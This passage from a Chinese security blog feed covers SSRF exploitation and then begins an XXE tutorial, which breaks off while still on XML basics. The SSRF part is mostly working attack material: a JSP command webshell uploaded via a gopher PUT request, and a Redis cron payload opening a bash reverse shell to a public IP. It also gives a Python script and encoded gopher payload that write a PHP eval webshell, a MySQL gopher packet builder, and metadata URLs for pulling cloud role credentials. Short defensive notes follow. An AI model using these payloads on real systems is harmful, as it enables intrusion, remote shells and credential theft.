class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en<br><span class="hljs-attribute">UserAgent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>460<br><br><span class="language-gradle">&lt;%</span><br><span class="language-gradle">    String command = request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);</span><br><span class="language-gradle">    <span class="hljs-keyword">if</span>(command != <span class="hljs-keyword">null</span>)</span><br><span class="language-gradle">    &#123;</span><br><span class="language-gradle">        java.io.InputStream in=<span class="hljs-keyword">Runtime</span>.getRuntime().exec(command).getInputStream();</span><br><span class="language-gradle">        <span class="hljs-keyword">int</span> a = -<span class="hljs-number">1</span>;</span><br><span class="language-gradle">        <span class="hljs-keyword">byte</span>[] b = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">2048</span>];</span><br><span class="language-gradle">        out.<span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>);</span><br><span class="language-gradle">        <span class="hljs-keyword">while</span>((a=in.<span class="hljs-keyword">read</span>(b))!=-<span class="hljs-number">1</span>)</span><br><span class="language-gradle">        &#123;</span><br><span class="language-gradle">            out.<span class="hljs-keyword">println</span>(<span class="hljs-keyword">new</span> String(b));</span><br><span class="language-gradle">        &#125;</span><br><span class="language-gradle">        out.<span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="language-gradle">    &#125; <span class="hljs-keyword">else</span> &#123;</span><br><span class="language-gradle">        out.<span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;format: xxx.jsp?cmd=Command&quot;</span>);</span><br><span class="language-gradle">    &#125;</span><br><span class="language-gradle">%&gt;</span><br></code></pre></td></tr></table></figure><p>利用gopher伪协议向内网发送PUT请求</p><p><img src="/img/image-20251202151000164.png" alt="image-20251202151000164"></p><p>观察到201则成功完成文件上传</p><p>随后对上传的木马进行利用</p><p><img src="/img/image-20251202151141465.png" alt="image-20251202151141465"></p><h3 id="Redis-未授权RCE"><a href="#Redis-未授权RCE" class="headerlink" title="Redis 未授权RCE"></a>Redis 未授权RCE</h3><p>Redis 是内存数据库，但允许把内存内容持久化到磁盘。如果没有认证 → 任何人都能远程执行 “写系统文件”。</p><p>系统没有web服务，也没有SSH公钥私钥认证，那就用定时任务实现远程代码执行</p><table><thead><tr><th>步骤</th><th>dict:&#x2F;&#x2F; 协议命令</th><th>动作说明（从原理角度）</th></tr></thead><tbody><tr><td>1</td><td><code>dict://172.72.23.27:6379/FLUSHALL</code></td><td>清空 Redis 内存数据，避免已有键值影响持久化过程</td></tr><tr><td>2</td><td><code>dict://172.72.23.27:6379/SET x &quot;\n* * * * * /bin/bash -i &gt;&amp; /dev/tcp/47.96.99.165/2333 0&gt;&amp;1\n&quot;</code></td><td>写入带首尾换行的文本内容，使其在落盘时能被系统按行解析</td></tr><tr><td>3</td><td><code>dict://172.72.23.27:6379/CONFIG SET dir /var/spool/cron/</code></td><td>修改 Redis 持久化目录，将持久化文件保存到 Linux 定时任务目录</td></tr><tr><td>4</td><td><code>dict://172.72.23.27:6379/CONFIG SET dbfilename root</code></td><td>设置持久化文件名为 <code>root</code>，对应 cron 用户任务文件路径 <code>/var/spool/cron/root</code></td></tr><tr><td>5</td><td><code>dict://172.72.23.27:6379/SAVE</code></td><td>触发 RDB 持久化，Redis 将内存写入上述路径文件，文件内容由系统解析</td></tr></tbody></table><p><img src="/img/image-20251202222921787.png" alt="image-20251202222921787"></p><p>最后成功反弹到监听的的端口</p><p><img src="/img/image-20251202222946469.png" alt="image-20251202222946469"></p><h3 id="redis未授权webshell写入（无法使用dict场景"><a href="#redis未授权webshell写入（无法使用dict场景" class="headerlink" title="redis未授权webshell写入（无法使用dict场景)"></a>redis未授权webshell写入（无法使用dict场景)</h3><p>对于172..150.23.28发现需要密码认证</p><p><img src="/img/image-20251203142553468.png" alt="image-20251203142553468"></p><p>发现其80端口存在web服务，是文件包含漏洞</p><p><img src="/img/image-20251203142808927.png" alt="image-20251203142808927"></p><p>读取&#x2F;etc&#x2F;redis.conf,读取到密码P@ssw0rd</p><p><img src="/img/image-20251203144304223.png" alt="image-20251203144304223"></p><p>验证一下发现验证通过</p><p><img src="/img/image-20251203144404750.png" alt="image-20251203144404750"></p><p>但是没啥用，dict不支持多行命令，无法跟前面那样执行命令，只能打gopher伪协议带redis数据包</p><p>这里有两种方法一种是</p><h4 id="直接用脚本构造"><a href="#直接用脚本构造" class="headerlink" title="直接用脚本构造"></a>直接用脚本构造</h4><p>脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br><br>protocol = <span class="hljs-string">&quot;gopher://&quot;</span><br>ip = <span class="hljs-string">&quot;172.150.23.28&quot;</span><br>port = <span class="hljs-string">&quot;6379&quot;</span><br>shell = <span class="hljs-string">&quot;\n\n&lt;?php eval($_GET[1]);?&gt;\n\n&quot;</span><br>filename = <span class="hljs-string">&quot;mo60.php&quot;</span><br>path = <span class="hljs-string">&quot;/var/www/html&quot;</span><br>passwd = <span class="hljs-string">&quot;P@ssw0rd&quot;</span><br>cmd = [<span class="hljs-string">&quot;flushall&quot;</span>,<br>     <span class="hljs-string">&quot;set 1 &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(shell.replace(<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-string">&quot;$&#123;IFS&#125;&quot;</span>)),  <br>     <span class="hljs-string">&quot;config set dir &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(path),<br>     <span class="hljs-string">&quot;config set dbfilename &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(filename),<br>     <span class="hljs-string">&quot;save&quot;</span>,<br>     <span class="hljs-string">&quot;quit&quot;</span><br>    ]<br><span class="hljs-keyword">if</span> passwd:<br>    cmd.insert(<span class="hljs-number">0</span>,<span class="hljs-string">&quot;AUTH &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(passwd))<br>payload = protocol + ip + <span class="hljs-string">&quot;:&quot;</span> + port + <span class="hljs-string">&quot;/_&quot;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">redis_format</span>(<span class="hljs-params">arr</span>):<br>    CRLF = <span class="hljs-string">&quot;\r\n&quot;</span><br>    redis_arr = arr.split(<span class="hljs-string">&quot; &quot;</span>)<br>    cmd = <span class="hljs-string">&quot;&quot;</span><br>    cmd += <span class="hljs-string">&quot;*&quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(redis_arr))<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> redis_arr:<br>        cmd += CRLF + <span class="hljs-string">&quot;$&quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>((x.replace(<span class="hljs-string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="hljs-string">&quot; &quot;</span>)))) + CRLF + x.replace(<span class="hljs-string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="hljs-string">&quot; &quot;</span>)<br>    cmd += CRLF<br>    <span class="hljs-keyword">return</span> cmd<br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> cmd:<br>        payload += urllib.parse.quote(redis_format(x))<br><br>    <span class="hljs-comment"># print(payload)</span><br>    <span class="hljs-built_in">print</span>(urllib.parse.quote(payload))<br> <br><br></code></pre></td></tr></table></figure><p>执行后得到</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">gopher</span>%<span class="hljs-number">3</span>A//<span class="hljs-number">172.150.23.28</span>%<span class="hljs-number">3</span>A6379/_%<span class="hljs-number">252</span>A2%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">25244</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>AAUTH%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">25248</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>AP%<span class="hljs-number">2540</span>ssw0rd%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">252</span>A1%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">25248</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>Aflushall%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">252</span>A3%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">25243</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>Aset%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">25241</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A1%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">252427</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">250</span>A%<span class="hljs-number">250</span>A%<span class="hljs-number">253</span>C%<span class="hljs-number">253</span>Fphp%<span class="hljs-number">2520</span>eval%<span class="hljs-number">2528</span>%<span class="hljs-number">2524</span>_GET%<span class="hljs-number">255</span>B1%<span class="hljs-number">255</span>D%<span class="hljs-number">2529</span>%<span class="hljs-number">253</span>B%<span class="hljs-number">253</span>F%<span class="hljs-number">253</span>E%<span class="hljs-number">250</span>A%<span class="hljs-number">250</span>A%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">252</span>A4%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">25246</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>Aconfig%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">25243</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>Aset%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">25243</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>Adir%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">252413</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A/var/www/html%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">252</span>A4%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">25246</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>Aconfig%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">25243</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>Aset%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">252410</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>Adbfilename%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">25248</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>Amo60.php%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">252</span>A1%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">25244</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>Asave%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">252</span>A1%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">25244</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>Aquit%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A<br></code></pre></td></tr></table></figure><p>发包利用成功</p><p><img src="/img/image-20251203155306472.png" alt="image-20251203155306472"></p><p>实现任意命令执行</p><p><img src="/img/image-20251203155327932.png" alt="image-20251203155327932"></p><h4 id="还有一种是手动构造数据包"><a href="#还有一种是手动构造数据包" class="headerlink" title="还有一种是手动构造数据包"></a>还有一种是手动构造数据包</h4><p>在本地模拟内网redis环境，首先在一端开启redis服务，并将6379转发到</p><p>5301端口</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">socat -v tcp-<span class="hljs-keyword">listen</span>:<span class="hljs-number">5301</span>,<span class="hljs-keyword">fork</span> tcp-<span class="hljs-keyword">connect</span>:<span class="hljs-number">127.0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>:<span class="hljs-number">6379</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20251203163735606.png" alt="image-20251203163735606"></p><p>在同时另一端登录5201，并执行操作</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">redis</span>-cli -h <span class="hljs-number">127.0.0.1</span> -p <span class="hljs-number">5201</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20251203163745116.png" alt="image-20251203163745116"></p><p>最后整理出redis数据包</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs livescript">*<span class="hljs-number">2</span><span class="hljs-string">\r</span><br>$<span class="hljs-number">4</span><span class="hljs-string">\r</span><br>auth<span class="hljs-string">\r</span><br>$<span class="hljs-number">8</span><span class="hljs-string">\r</span><br>P@ssw0rd<span class="hljs-string">\r</span><br>*<span class="hljs-number">1</span><span class="hljs-string">\r</span><br>$<span class="hljs-number">8</span><span class="hljs-string">\r</span><br>flushall<span class="hljs-string">\r</span><br>*<span class="hljs-number">4</span><span class="hljs-string">\r</span><br>$<span class="hljs-number">6</span><span class="hljs-string">\r</span><br>config<span class="hljs-string">\r</span><br>$<span class="hljs-number">3</span><span class="hljs-string">\r</span><br>set<span class="hljs-string">\r</span><br>$<span class="hljs-number">3</span><span class="hljs-string">\r</span><br>dir<span class="hljs-string">\r</span><br>$<span class="hljs-number">13</span><span class="hljs-string">\r</span><br>/<span class="hljs-keyword">var</span>/www/html<span class="hljs-string">\r</span><br>*<span class="hljs-number">4</span><span class="hljs-string">\r</span><br>$<span class="hljs-number">6</span><span class="hljs-string">\r</span><br>config<span class="hljs-string">\r</span><br>$<span class="hljs-number">3</span><span class="hljs-string">\r</span><br>set<span class="hljs-string">\r</span><br>$<span class="hljs-number">10</span><span class="hljs-string">\r</span><br>dbfilename<span class="hljs-string">\r</span><br>$<span class="hljs-number">9</span><span class="hljs-string">\r</span><br>shell.php<span class="hljs-string">\r</span><br>*<span class="hljs-number">3</span><span class="hljs-string">\r</span><br>$<span class="hljs-number">3</span><span class="hljs-string">\r</span><br>set<span class="hljs-string">\r</span><br>$<span class="hljs-number">1</span><span class="hljs-string">\r</span><br>x<span class="hljs-string">\r</span><br>$<span class="hljs-number">25</span><span class="hljs-string">\r</span><br> <br> <br>&lt;?php <span class="hljs-built_in">eval</span>($_GET[<span class="hljs-number">1</span>]);?&gt;<br> <br> <br><span class="hljs-string">\r</span><br>*<span class="hljs-number">1</span><span class="hljs-string">\r</span><br>$<span class="hljs-number">4</span><span class="hljs-string">\r</span><br>save<span class="hljs-string">\r</span><br><br></code></pre></td></tr></table></figure><p>注意Redis 的协议是以 CRLF (rn) 结尾，所以转换的时候需要把 \r 转换为 \r\n</p><p><img src="/img/image-20251203171521940.png" alt="image-20251203171521940"></p><p>随后进行两次url编码，发包</p><p><img src="/img/image-20251203171556959.png" alt="image-20251203171556959"></p><h3 id="gopher打未授权Mysql"><a href="#gopher打未授权Mysql" class="headerlink" title="gopher打未授权Mysql"></a>gopher打<strong>未授权Mysql</strong></h3><p>这里同样是两种方法一种是直接用工具构造playload<a href="https://github.com/tarunkant/Gopherus">https://github.com/tarunkant/Gopherus</a></p><p>运行命令</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python2.<span class="hljs-number">7</span> gopherus<span class="hljs-selector-class">.py</span> <span class="hljs-attr">--exploit</span> mysql<br></code></pre></td></tr></table></figure><p>随后输入mysql用户和要执行的sql语句</p><p><img src="/img/image-20251203215047221.png" alt="image-20251203215047221"></p><p>最后发送gopher伪协议即可</p><p><img src="/img/image-20251203215145242.png" alt="image-20251203215145242"></p><p><img src="/img/image-20251203215128232.png" alt="image-20251203215128232"></p><p>第二种方法是手动构造mysql数据包</p><p>首先监听3306端口</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># lo 回环接口网卡 -w 报错 pcapng 数据包</span><br><span class="hljs-attribute">tcpdump</span> -i lo port <span class="hljs-number">3306</span> -w mysql.pcapng<br></code></pre></td></tr></table></figure><p>随后在本地执行mysql命令</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">mysql -uroot -h127.<span class="hljs-number">0.0</span>.<span class="hljs-number">1</span> -e <span class="hljs-string">&quot;select * from flag.test&quot;</span><span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>Wireshark 打开 mysql.pcapng 数据包，追踪 TCP 流 然后过滤出发给 3306 的数据然后过滤出客户端发送到MySQL服务器的数据包，将显示格式调整为原始数据即可：</p><p><img src="/img/645861655.png" alt="81830-ph696qxna6b.png"></p><p>然后使用如下的 Python3 脚本将数据转化为 url 编码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">results</span>(<span class="hljs-params">s</span>):<br>    a=[s[i:i+<span class="hljs-number">2</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(s),<span class="hljs-number">2</span>)]<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;curl gopher://127.0.0.1:3306/_%&quot;</span>+<span class="hljs-string">&quot;%&quot;</span>.join(a)<br><br>s=<span class="hljs-string">&quot;3c00000185a20f0000000001210000000000000000000000000000000000000000000000726f6f7400006d7973716c5f6e61746976655f70617373776f726400210000000373656c65637420404076657273696f6e5f636f6d6d656e74206c696d69742031180000000373656c656374202a2066726f6d20666c61672e746573740100000001&quot;</span><br><br><span class="hljs-built_in">print</span>(results(s))<br><br></code></pre></td></tr></table></figure><p>放入到 BP 中请求的话记得需要二次 URL 编码,成功查询到flag</p><p><img src="/img/2776210982.png" alt="58024-tt42tmq7t6.png"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><h4 id="SSRF-漏洞的成因："><a href="#SSRF-漏洞的成因：" class="headerlink" title="SSRF 漏洞的成因："></a><strong>SSRF 漏洞的成因：</strong></h4><ol><li><p>直接使用用户输入的 URL 作为请求目标；</p></li><li><p>不适当的协议和端口控制；</p></li><li><p>内部网络或敏感资源未加隔离或防护；</p></li><li><p>不正确的权限和访问控制。</p><table><thead><tr><th><strong>潜在绕过手法（供防御方识别风险）</strong></th><th><strong>安全修复方法（推荐）</strong></th></tr></thead><tbody><tr><td>IP 进制转换（如 <em>127.0.0.1 → 2130706433</em>）</td><td>将 IP <strong>统一解析为标准 IPv4&#x2F;IPv6</strong> 后再判断是否属于内网段</td></tr><tr><td>域名混淆（如 <em>example.com → example.com. → 实际解析到内网</em>）</td><td>解析域名 → 获取真实 IP → <strong>按解析结果校验内网范围</strong></td></tr><tr><td>重定向绕过（如合法域名跳转到 <em>内网 IP</em>）</td><td>禁用自动重定向（<code>followRedirects = false</code>）或对重定向后的 URL <strong>重新校验</strong></td></tr><tr><td>协议混淆（如 <em>dict:&#x2F;&#x2F; → DICT:&#x2F;&#x2F; → dict%3A&#x2F;&#x2F;</em>）</td><td>对 URL 进行 <strong>标准化（lowercase + decode）</strong> 再检查协议，仅允许 http&#x2F;https</td></tr><tr><td>端口绕过（如 <em>6379 → 06379 → 6379&#x2F;</em>）</td><td><strong>标准化端口号</strong>，并限制仅允许 80&#x2F;443 等安全端口范围</td></tr></tbody></table></li></ol><h4 id="SSRF-漏洞的修复方法："><a href="#SSRF-漏洞的修复方法：" class="headerlink" title="SSRF 漏洞的修复方法："></a><strong>SSRF 漏洞的修复方法：</strong></h4><ol><li><strong>输入验证与白名单</strong>：只允许特定格式和协议的 URL，禁止内网访问；</li><li><strong>服务端访问控制</strong>：严格的权限校验，尤其是针对内网和敏感资源；</li><li><strong>代理与白名单</strong>：通过代理服务器转发请求，并对目标进行访问控制；</li><li><strong>防止 DNS Rebinding</strong>：对 IP 地址与域名进行比对；</li><li><strong>日志与监控</strong>：记录外部请求，并及时分析检测异常行为。</li></ol><p>通过这些修复措施，可以有效地减轻 SSRF 漏洞的风险，保护应用程序免受此类攻击。</p><h2 id="拓展-云上SSRF"><a href="#拓展-云上SSRF" class="headerlink" title="拓展-云上SSRF"></a>拓展-云上SSRF</h2><p>其实云上ssrf和普通ssrf原理相似但是云上ssrf危害更大，攻击面更广。</p><p>在云服务ssrf利用中：</p><p>1、攻击元数据服务：云环境中，云数据即表示实例，可以用来查看、配置甚至管理正在运行中的实例。</p><p>2、攻击存储桶：攻击者通过访问元数据中存储的临时秘钥或者用于自启动实例的启动脚本，这些脚本可能会包含AK、密码、源码等等，然后根据从元数据服务获取的信息，攻击者可尝试获取到受害者账户下COS、CVM、集群等服务的权限。</p><p>3、攻击Kubelet API：在云环境中，可通过Kubelet API查询集群pod和node的信息，也可通过其执行命令。（Kubernetes API 用于与集群及其各种资源进行交互。有不同的资源类型和资源实例，以API对象的形式存在。是集群的一部分，API 会指导它们在必要时执行特定操作。）</p><p>4、越权攻击云平台内其他组件或服务：由于云上各组件相互信任，当云平台内某个组件或服务存在SSRF漏洞时，就可通过此漏洞越权攻击其他组件或者服务。</p><p><strong>其实最常见的攻击手法就是攻击元数据服务</strong></p><p>在腾讯云中可以利用ssrf读取如下数据：</p><p>1、获取实例物理所在地信息。</p><p><a href="http://metadata.tencentyun.com/latest/meta-data/placement/region">http://metadata.tencentyun.com/latest/meta-data/placement/region</a></p><p><img src="/img/f934081435a063dfe864b9e1dd048a9d793e56e4e6794.jpg" alt="img"></p><p>2、获取实例内⽹ IP。实例存在多张⽹卡时，返回 eth0 设备的⽹络地址。</p><p><a href="http://metadata.tencentyun.com/latest/meta-data/local-ipv4">http://metadata.tencentyun.com/latest/meta-data/local-ipv4</a></p><p><img src="/img/f6659620931978b397557dc958bdddc2cb7c555ebec27.jpg" alt="img"></p><p>3、获取实例公⽹ IP</p><p><a href="http://metadata.tencentyun.com/latest/meta-data/public-ipv4">http://metadata.tencentyun.com/latest/meta-data/public-ipv4</a></p><p><img src="/img/f39598983601b8fd0a9a8d4586442fde74fb77bea2a55.jpg" alt="img"></p><p>4、获取实例网络接口 VPC 网络 ID。</p><p><a href="http://metadata.tencentyun.com/network/interfaces/macs/$%7Bmac%7D/vpc-id">http://metadata.tencentyun.com/network/interfaces/macs/${mac}/vpc-id</a></p><p><img src="/img/f6404350d6b402b4a4e34f6650a352bcaa8a8336d8d83.jpg" alt="img"></p><p>5、在获取到⻆⾊名称后，可以通过以下链接取⻆⾊的临时凭证，${role-name} 为 CAM 角⾊的名称：</p><p><a href="http://metadata.tencentyun.com/latest/meta-data/cam/security-credentials$%7Brolename%7D">http://metadata.tencentyun.com/latest/meta-data/cam/security-credentials${rolename}</a></p><p><img src="/img/f606276e13359e8a07d71c11e88837512bf7ea5689ba9.jpg" alt="img"></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
    
    
    <categories>
      
      <category>Web渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SSRF</tag>
      
      <tag>Web安全</tag>
      
      <tag>漏洞分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XXE学习总结</title>
    <link href="/2025/11/20/XXE%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/"/>
    <url>/2025/11/20/XXE%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="XXE学习总结"><a href="#XXE学习总结" class="headerlink" title="XXE学习总结"></a>XXE学习总结</h1><h2 id="前言-关于XML"><a href="#前言-关于XML" class="headerlink" title="前言-关于XML"></a>前言-关于XML</h2><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>XML（数据读取）是一种标记语言，用于存储和传输数据，标签无意义。</p><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><p>1、标签没有功能性</p><p>2、xml标签必须闭合，层次分明，嵌套正确，对大小写敏感</p><p>3、xml文档必须有根元素</p><p>4、头声明可有可无</p><p>5、实体引用规则 </p><p><img src="/img/image-20251021184302447.png" alt="image-20251021184302447"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>  encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">man</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>zhangsan<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">sex</span>&gt;</span>男<span class="hljs-tag">&lt;/<span class="hljs-name">sex</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">man</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="使用php解析xml"><a href="#使用php解析xml" class="headerlink" title="使用php解析xml"></a>使用php解析xml</h3><h4 id="simplexml-load-file-读取"><a href="#simplexml-load-file-读取" class="headerlink" title="simplexml_load_file()读取"></a>simplexml_load_file()读取</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$xml</span>=<span class="hljs-title function_ invoke__">simplexml_load_file</span>(<span class="hljs-string">&quot;1.xml&quot;</span>);<br>    <span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$xml</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$xml</span>-&gt;man[<span class="hljs-number">0</span>]-name<br></code></pre></td></tr></table></figure><p>DOMDocument读取</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$doc</span>=<span class="hljs-keyword">new</span> <span class="hljs-title 